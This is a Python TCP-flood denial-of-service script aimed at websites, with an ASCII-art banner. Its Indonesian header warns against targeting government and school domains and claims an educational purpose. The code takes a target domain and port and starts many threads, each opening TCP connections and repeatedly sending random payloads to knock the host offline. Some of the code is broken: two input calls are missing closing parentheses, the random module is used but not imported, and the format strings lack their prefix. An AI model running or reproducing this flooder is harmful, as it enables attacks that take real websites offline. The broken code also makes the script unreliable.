## ======================= [ # ] PERINGATAN !! =======================
## Jangan Di Gunakan Untuk DDoS Website Seperti > ".go.id" - ".sch.id" ".gov"  ##
## Jika Tools Ini Di Gunakan Sembarangan Kami Tidak BerTanggung Jawab Atas Kelalaian Kalian Terhadap Penyalahgunaan Tools Ini!!
## Tools INI DI Kembangkan Bertujuan Untuk Edukasi, Agar Para Beginner Python Dapat Menambah Wawasan Serta Yang Lainya Dapat Ikut Belajar.
## Terimakasih..
import os
import sys
import time
import socket
import threading

#red = '\033[91m'
#green = '\033[92m'
#noncolor = '\033[0m'
#blue = '\033[33m'

def clear():
	os.system('cls' if os.name=='nt' else 'clear')

clear()
#merah
print("""\033[91m

████████╗                =-=-=-=-=-=-=-=- [ TCP FOR WEBSITE ] =-=-=-=-=-=-=-=-
╚══██╔══╝           =-=-=-=-=-=-=-=- [ Developer Tools Bimzzx ] =-=-=-=-=-=-=-=-
         ██║   
         ██║   
         ██║   
         ╚═╝   
         
   ██████╗ 
██╔════╝ 
██║      
██║      
╚██████╗ 
   ╚═════╝ 
         
██████╗  
██╔══██╗ 
██████╔╝ 
██╔═══╝  
██║      
╚═╝      """)
##################################################
host = str(input("[ # ] Masukkan Domainnya  >> "))
port = int(input("[ # ] Masukkan Portnya >> "))
times = int(input("[ # ] Connections (300) >> ")
threads = int(input("[ # ] Threading (3016) >> ")
ip = socket.gethostbyname(host) # hostname to ip convert
print("\033[33m") # biru
clear()
##################################################

def attack():
	data = random._urandom(3016)
	i = random.choice(("[*]","[!]","[#]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Disini Saya Menggunakan SockStream Karena Kita Memakai Metode TCP
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +"Sentt to {ip} on port {port}!!!")
		except:
			s.close()
			print("[ $ ] {ip} on port {port} down!!")


for y in range(threads):
    th = threading.Thread(target = attack)
    th.start()
